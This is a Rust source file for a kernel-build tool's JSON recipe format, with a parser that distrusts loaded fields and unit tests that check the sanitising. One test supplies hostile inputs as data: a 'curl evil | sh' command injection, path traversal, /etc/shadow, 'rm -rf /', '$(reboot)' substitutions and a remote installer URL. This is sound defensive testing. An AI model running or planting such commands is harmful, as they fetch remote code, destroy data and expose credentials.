//! `.kernel` files: a whole kernel build, written down.
//!
//! A `.kernel` file records everything needed to rebuild the same kernel
//! somewhere else or later: which kernel version, what config to start from,
//! the tweaks, any extra options, and the software that goes with it. It is
//! plain JSON so it can be read, diffed and kept in version control.
//!
//! These files get shared, so loading one treats every field as untrusted:
//! unknown tweaks are dropped with a warning, versions and package names are
//! validated, and nothing in a file can name a file on disk to read. Loading
//! never builds or installs anything - it only fills in the form.

use crate::json::{self, Json};
use crate::kconfig::{self, Config};
use crate::{catalog, software, sources};
use std::collections::BTreeMap;

pub const FORMAT: &str = "kertweaker.kernel";
pub const FORMAT_VERSION: usize = 1;
pub const EXTENSION: &str = "kernel";

/// A full `.config` embedded in a file is a few hundred kilobytes at most.
const MAX_BYTES: usize = 4 * 1024 * 1024;

/// The config a recipe starts from.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Base {
    /// The config of whatever kernel the machine is running at build time.
    Running,
    /// `make defconfig`.
    Defconfig,
    /// A complete `.config` carried inside the file, which makes the recipe
    /// reproduce the same kernel on any machine.
    Embedded(String),
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Recipe {
    pub name: String,
    pub description: String,
    /// kernel.org version to download, e.g. `6.12.1`.
    pub kernel_version: Option<String>,
    pub base: Base,
    pub selections: BTreeMap<String, String>,
    pub extra: String,
    pub software: Vec<String>,
    pub packages: Vec<String>,
    /// `image`, `deb` or `rpm`; `None` lets the machine pick.
    pub output: Option<String>,
    pub llvm: bool,
}

impl Default for Recipe {
    fn default() -> Self {
        Recipe {
            name: "my-kernel".to_string(),
            description: String::new(),
            kernel_version: None,
            base: Base::Running,
            selections: BTreeMap::new(),
            extra: String::new(),
            software: Vec::new(),
            packages: Vec::new(),
            output: None,
            llvm: false,
        }
    }
}

/// A name that is safe as a file name and pleasant in a title.
pub fn clean_name(name: &str) -> Option<String> {
    let n = name.trim();
    let ok = !n.is_empty()
        && n.len() <= 48
        && !n.starts_with('.')
        && n.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | ' ' | '.'));
    ok.then(|| n.to_string())
}

impl Recipe {
    /// The file name this recipe should be saved under.
    pub fn file_name(&self) -> String {
        let stem: String = self
            .name
            .chars()
            .map(|c| if c == ' ' { '-' } else { c })
            .collect();
        format!("{stem}.{EXTENSION}")
    }

    /// Render as the text of a `.kernel` file.
    pub fn render(&self) -> String {
        let mut kernel = Vec::new();
        if let Some(v) = &self.kernel_version {
            kernel.push(("version", Json::s(v.clone())));
        }
        let base = match &self.base {
            Base::Running => Json::obj(vec![("mode", Json::s("running"))]),
            Base::Defconfig => Json::obj(vec![("mode", Json::s("defconfig"))]),
            Base::Embedded(text) => Json::obj(vec![
                ("mode", Json::s("embedded")),
                ("config", Json::s(text.clone())),
            ]),
        };
        let mut build = Vec::new();
        if let Some(o) = &self.output {
            build.push(("output", Json::s(o.clone())));
        }
        build.push(("clang", Json::b(self.llvm)));

        Json::obj(vec![
            ("format", Json::s(FORMAT)),
            ("version", Json::u(FORMAT_VERSION)),
            ("name", Json::s(self.name.clone())),
            ("description", Json::s(self.description.clone())),
            (
                "created_with",
                Json::s(format!("kertweaker {}", crate::VERSION)),
            ),
            ("kernel", Json::obj(kernel)),
            (
                "tweaks",
                Json::Obj(
                    self.selections
                        .iter()
                        .map(|(k, v)| (k.clone(), Json::s(v.clone())))
                        .collect(),
                ),
            ),
            (
                "extra_options",
                Json::strs(self.extra.lines().map(str::to_string)),
            ),
            ("software", Json::strs(self.software.clone())),
            ("packages", Json::strs(self.packages.clone())),
            ("build", Json::obj(build)),
            // Last, because an embedded config is long.
            ("base", base),
        ])
        .pretty()
    }

    /// A short human-readable summary, for `kertweaker show`.
    pub fn summary(&self) -> Vec<String> {
        let mut out = vec![format!("{}", self.name)];
        if !self.description.is_empty() {
            out.push(format!("  {}", self.description));
        }
        out.push(format!(
            "  kernel     {}",
            self.kernel_version
                .as_deref()
                .unwrap_or("not pinned (choose a source when building)")
        ));
        out.push(format!(
            "  starts from {}",
            match &self.base {
                Base::Running => "the running kernel's config".to_string(),
                Base::Defconfig => "kernel defaults (defconfig)".to_string(),
                Base::Embedded(t) =>
                    format!("an embedded config ({} options)", Config::parse(t).len()),
            }
        ));
        out.push(format!("  tweaks     {}", self.selections.len()));
        for (id, value) in &self.selections {
            let label = catalog::tweak(id)
                .map(|t| {
                    let chosen = t.option(value).map(|o| o.label).unwrap_or(value.as_str());
                    format!("{}: {}", t.title, chosen)
                })
                .unwrap_or_else(|| format!("{id}: {value}"));
            out.push(format!("    - {label}"));
        }
        let extra = kconfig::parse_fragment(&self.extra).len();
        if extra > 0 {
            out.push(format!("  extra      {extra} raw option(s)"));
        }
        if !self.software.is_empty() {
            let names: Vec<&str> = self
                .software
                .iter()
                .map(|id| software::app(id).map(|a| a.title).unwrap_or(id.as_str()))
                .collect();
            out.push(format!("  software   {}", names.join(", ")));
        }
        if !self.packages.is_empty() {
            out.push(format!("  packages   {}", self.packages.join(" ")));
        }
        if let Some(o) = &self.output {
            out.push(format!("  output     {o}"));
        }
        out
    }
}

/// Parse the text of a `.kernel` file.
///
/// Returns the recipe plus warnings about anything that was dropped. Only a
/// file that is not a `.kernel` file at all is an error; a recipe from a newer
/// kertweaker still loads, minus the parts this version does not know.
pub fn parse(text: &str) -> Result<(Recipe, Vec<String>), String> {
    if text.len() > MAX_BYTES {
        return Err("this file is too large to be a .kernel file".into());
    }
    let doc = json::parse(text).map_err(|e| format!("not a .kernel file: {e}"))?;
    if doc.str_or("format", "") != FORMAT {
        return Err("not a .kernel file (the \"format\" field is missing or wrong)".into());
    }
    let version = doc.get("version").and_then(Json::as_usize).unwrap_or(0);
    if version == 0 {
        return Err("not a .kernel file (no format version)".into());
    }

    let mut warnings = Vec::new();
    if version > FORMAT_VERSION {
        warnings.push(format!(
            "This file was written by a newer kertweaker (format {version}); anything this \
             version does not understand is ignored."
        ));
    }

    let mut recipe = Recipe::default();
    match clean_name(doc.str_or("name", "")) {
        Some(n) => recipe.name = n,
        None => {
            if !doc.str_or("name", "").is_empty() {
                warnings.push("The name contained unusual characters and was replaced.".into());
            }
        }
    }
    recipe.description = doc
        .str_or("description", "")
        .chars()
        .filter(|c| !c.is_control())
        .take(300)
        .collect();

    // ------------------------------------------------------------- kernel
    if let Some(v) = doc
        .get("kernel")
        .and_then(|k| k.get("version"))
        .and_then(Json::as_str)
    {
        if sources::valid_version(v) {
            recipe.kernel_version = Some(v.to_string());
        } else {
            warnings.push(format!(
                "Ignored kernel version {v:?}: not a valid version."
            ));
        }
    }

    // --------------------------------------------------------------- base
    let base = doc.get("base").cloned().unwrap_or(Json::Null);
    recipe.base = match base.str_or("mode", "running") {
        "running" => Base::Running,
        "defconfig" => Base::Defconfig,
        "embedded" => {
            let config = base.str_or("config", "");
            if Config::parse(config).is_empty() {
                warnings.push(
                    "The embedded config had no CONFIG_ options in it; starting from the running \
                     kernel instead."
                        .into(),
                );
                Base::Running
            } else {
                Base::Embedded(config.to_string())
            }
        }
        other => {
            warnings.push(format!(
                "Unknown starting config {other:?}; starting from the running kernel instead."
            ));
            Base::Running
        }
    };

    // ------------------------------------------------------------- tweaks
    if let Some(Json::Obj(pairs)) = doc.get("tweaks") {
        for (id, value) in pairs {
            let Some(value) = value.as_str() else {
                warnings.push(format!("Ignored tweak {id:?}: its value is not text."));
                continue;
            };
            match catalog::tweak(id) {
                None => warnings.push(format!("Ignored unknown tweak {id:?}.")),
                Some(t) => {
                    let free = matches!(t.kind, catalog::Kind::Text | catalog::Kind::Number);
                    if free || t.option(value).is_some() {
                        if value != "keep" && !value.is_empty() {
                            recipe.selections.insert(id.clone(), value.to_string());
                        }
                    } else {
                        warnings.push(format!(
                            "Ignored {:?}: it has no option {value:?}.",
                            t.title
                        ));
                    }
                }
            }
        }
    }

    // ------------------------------------------------------ extra options
    // Accept a list of lines (what we write) or one string. Either way, only
    // real config lines survive; anything else in there is not carried along.
    let raw_extra = match doc.get("extra_options") {
        Some(Json::Arr(lines)) => lines
            .iter()
            .filter_map(Json::as_str)
            .collect::<Vec<_>>()
            .join("\n"),
        Some(Json::Str(s)) => s.clone(),
        _ => String::new(),
    };
    let fragment = kconfig::parse_fragment(&raw_extra);
    let dropped = raw_extra
        .lines()
        .map(str::trim)
        // Blank lines and ordinary comments are fine to lose silently.
        .filter(|l| !l.is_empty() && !(l.starts_with('#') && !l.ends_with(" is not set")))
        .filter(|l| kconfig::parse_fragment(l).is_empty())
        .count();
    if dropped > 0 {
        warnings.push(format!(
            "{dropped} line(s) under extra_options were not config options and were dropped."
        ));
    }
    recipe.extra = catalog::fragment_text_ordered(&fragment);

    // ----------------------------------------------------------- software
    if let Some(items) = doc.get("software").and_then(Json::as_array) {
        for id in items.iter().filter_map(Json::as_str) {
            if software::app(id).is_some() {
                if !recipe.software.iter().any(|s| s == id) {
                    recipe.software.push(id.to_string());
                }
            } else if software::valid_package(id) {
                // Not an app this version knows: keep it as a plain package.
                warnings.push(format!(
                    "{id:?} is not software kertweaker knows, so it is treated as a package name."
                ));
                if !recipe.packages.iter().any(|p| p == id) {
                    recipe.packages.push(id.to_string());
                }
            } else {
                warnings.push(format!("Ignored software entry {id:?}."));
            }
        }
    }
    if let Some(items) = doc.get("packages").and_then(Json::as_array) {
        for name in items.iter().filter_map(Json::as_str) {
            if software::valid_package(name) {
                if !recipe.packages.iter().any(|p| p == name) {
                    recipe.packages.push(name.to_string());
                }
            } else {
                warnings.push(format!(
                    "Ignored package {name:?}: not a valid package name."
                ));
            }
        }
    }

    // -------------------------------------------------------------- build
    if let Some(build) = doc.get("build") {
        match build.str_or("output", "") {
            "" => {}
            o @ ("image" | "deb" | "rpm") => recipe.output = Some(o.to_string()),
            other => warnings.push(format!("Ignored unknown output format {other:?}.")),
        }
        recipe.llvm = build.bool_or("clang", false);
    }

    Ok((recipe, warnings))
}

/// JSON for the GUI: the recipe in the shape the page's state uses.
pub fn to_state_json(recipe: &Recipe, warnings: &[String]) -> Json {
    let (base_mode, base_text) = match &recipe.base {
        Base::Running => ("running", ""),
        Base::Defconfig => ("defconfig", ""),
        Base::Embedded(t) => ("text", t.as_str()),
    };
    Json::obj(vec![
        ("name", Json::s(recipe.name.clone())),
        ("description", Json::s(recipe.description.clone())),
        ("kernel_version", Json::opt_s(recipe.kernel_version.clone())),
        (
            "base",
            Json::obj(vec![
                ("mode", Json::s(base_mode)),
                ("text", Json::s(base_text)),
            ]),
        ),
        (
            "selections",
            Json::Obj(
                recipe
                    .selections
                    .iter()
                    .map(|(k, v)| (k.clone(), Json::s(v.clone())))
                    .collect(),
            ),
        ),
        ("extra", Json::s(recipe.extra.clone())),
        ("software", Json::strs(recipe.software.clone())),
        ("packages", Json::strs(recipe.packages.clone())),
        ("output", Json::opt_s(recipe.output.clone())),
        ("llvm", Json::b(recipe.llvm)),
        ("warnings", Json::strs(warnings.to_vec())),
        ("summary", Json::strs(recipe.summary())),
    ])
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample() -> Recipe {
        let mut selections = BTreeMap::new();
        selections.insert("preempt".to_string(), "full".to_string());
        selections.insert("hz".to_string(), "1000".to_string());
        selections.insert("localversion".to_string(), "-gaming".to_string());
        Recipe {
            name: "my gaming rig".into(),
            description: "Low latency, Steam ready".into(),
            kernel_version: Some("6.12.1".into()),
            base: Base::Running,
            selections,
            extra: "CONFIG_USB_SERIAL=m\n# CONFIG_BT is not set\n".into(),
            software: vec!["steam".into(), "flatpak".into()],
            packages: vec!["htop".into()],
            output: Some("deb".into()),
            llvm: false,
        }
    }

    #[test]
    fn a_recipe_survives_a_round_trip() {
        let original = sample();
        let text = original.render();
        let (back, warnings) = parse(&text).unwrap();
        assert!(warnings.is_empty(), "{warnings:?}");
        assert_eq!(back, original);
        // And writing it again produces the same bytes: stable for version control.
        assert_eq!(back.render(), text);
    }

    #[test]
    fn the_file_is_readable_json_with_a_format_marker() {
        let text = sample().render();
        assert!(text.starts_with("{\n  \"format\": \"kertweaker.kernel\",\n  \"version\": 1,"));
        assert!(text.contains("\"tweaks\": {\n    \"hz\": \"1000\","));
        assert!(text.contains("\"software\": [\n    \"steam\",\n    \"flatpak\"\n  ]"));
        assert_eq!(sample().file_name(), "my-gaming-rig.kernel");
    }

    #[test]
    fn an_embedded_config_makes_the_file_self_contained() {
        let mut r = sample();
        r.base = Base::Embedded("CONFIG_A=y\n# CONFIG_B is not set\nCONFIG_S=\"x y\"\n".into());
        let (back, warnings) = parse(&r.render()).unwrap();
        assert!(warnings.is_empty(), "{warnings:?}");
        assert_eq!(back.base, r.base);
    }

    #[test]
    fn things_that_are_not_kernel_files_are_rejected() {
        for bad in [
            "",
            "hello",
            "{}",
            r#"{"format":"something.else","version":1}"#,
            r#"{"format":"kertweaker.kernel"}"#,
            "[1,2,3]",
        ] {
            assert!(parse(bad).is_err(), "{bad:?} should not load");
        }
        let huge = format!(
            r#"{{"format":"kertweaker.kernel","version":1,"description":"{}"}}"#,
            "x".repeat(MAX_BYTES)
        );
        assert!(parse(&huge).unwrap_err().contains("too large"));
    }

    #[test]
    fn hostile_content_is_dropped_with_warnings_not_trusted() {
        let text = r#"{
            "format": "kertweaker.kernel",
            "version": 1,
            "name": "../../etc/cron.d/evil",
            "kernel": { "version": "6.12; curl evil | sh", "path": "/tmp/planted" },
            "base": { "mode": "file", "path": "/etc/shadow" },
            "tweaks": { "preempt": "full", "nonsense": "x", "hz": "9999", "nr_cpus": 16 },
            "extra_options": ["CONFIG_OK=y", "rm -rf /", "$(reboot)"],
            "software": ["steam", "zzqx-nope", "bad name; reboot"],
            "packages": ["htop", "gimp && reboot", "-o", "$(id)"],
            "build": { "output": "exe", "clang": true }
        }"#;
        let (r, warnings) = parse(text).unwrap();

        assert_eq!(
            r.name, "my-kernel",
            "an unsafe name falls back to the default"
        );
        assert_eq!(r.kernel_version, None);
        // A file can never point the build at a path to read.
        assert_eq!(r.base, Base::Running);
        assert_eq!(r.selections.len(), 1);
        assert_eq!(r.selections["preempt"], "full");
        assert_eq!(r.extra, "CONFIG_OK=y\n");
        assert_eq!(r.software, vec!["steam"]);
        // An unknown-but-harmless name is kept as a package to look up later.
        assert_eq!(r.packages, vec!["zzqx-nope", "htop"]);
        assert_eq!(r.output, None);
        assert!(r.llvm);

        let all = warnings.join("\n");
        for needle in [
            "kernel version",
            "Unknown starting config",
            "unknown tweak \"nonsense\"",
            "no option \"9999\"",
            "not text",
            "were not config options",
            "\"zzqx-nope\" is not software kertweaker knows",
            "Ignored software entry",
            "Ignored package \"gimp && reboot\"",
            "unknown output format",
        ] {
            assert!(
                all.contains(needle),
                "missing warning about {needle:?} in:\n{all}"
            );
        }
        // Nothing dangerous survived into anything that gets rendered or run.
        let rendered = r.render();
        for danger in [
            "reboot",
            "rm -rf",
            "/etc/shadow",
            "/tmp/planted",
            "curl",
            "$(",
        ] {
            assert!(
                !rendered.contains(danger),
                "{danger:?} leaked into the recipe"
            );
        }
    }

    #[test]
    fn a_newer_format_still_loads_what_it_can() {
        let text = r#"{"format":"kertweaker.kernel","version":7,"name":"future",
                       "tweaks":{"preempt":"full","quantum_scheduler":"on"},"hologram":true}"#;
        let (r, warnings) = parse(text).unwrap();
        assert_eq!(r.name, "future");
        assert_eq!(r.selections.len(), 1);
        assert!(warnings[0].contains("newer kertweaker"));
        assert!(warnings.iter().any(|w| w.contains("quantum_scheduler")));
    }

    #[test]
    fn gurt_is_software_a_file_can_ask_for() {
        let text = r#"{"format":"kertweaker.kernel","version":1,"software":["gurt","steam"]}"#;
        let (r, warnings) = parse(text).unwrap();
        assert!(warnings.is_empty(), "{warnings:?}");
        assert_eq!(r.software, vec!["gurt", "steam"]);
        assert!(r.packages.is_empty());
        // A file can only name the app. Where its installer comes from is
        // fixed in kertweaker, so a shared file cannot point it elsewhere.
        let sneaky = r#"{"format":"kertweaker.kernel","version":1,"software":["gurt"],
                         "script":"https://evil.example/x.sh","scripts":{"gurt":"https://evil.example/x.sh"}}"#;
        let (r2, _) = parse(sneaky).unwrap();
        assert!(!r2.render().contains("evil.example"));
    }

    #[test]
    fn minimal_files_get_sensible_defaults() {
        let (r, warnings) = parse(r#"{"format":"kertweaker.kernel","version":1}"#).unwrap();
        assert!(warnings.is_empty());
        assert_eq!(r, Recipe::default());
    }

    #[test]
    fn summary_reads_like_a_description() {
        let lines = sample().summary().join("\n");
        assert!(lines.contains("my gaming rig"));
        assert!(lines.contains("6.12.1"));
        assert!(lines.contains("Preemption model: Full preemption"));
        assert!(lines.contains("Steam, Flatpak"));
        assert!(lines.contains("htop"));
    }

    #[test]
    fn names_are_cleaned() {
        assert_eq!(clean_name("  my kernel-2 ").as_deref(), Some("my kernel-2"));
        for bad in ["", "a/b", "..", ".hidden", "x\ny", &"n".repeat(49)] {
            assert!(clean_name(bad).is_none(), "{bad:?}");
        }
    }
}
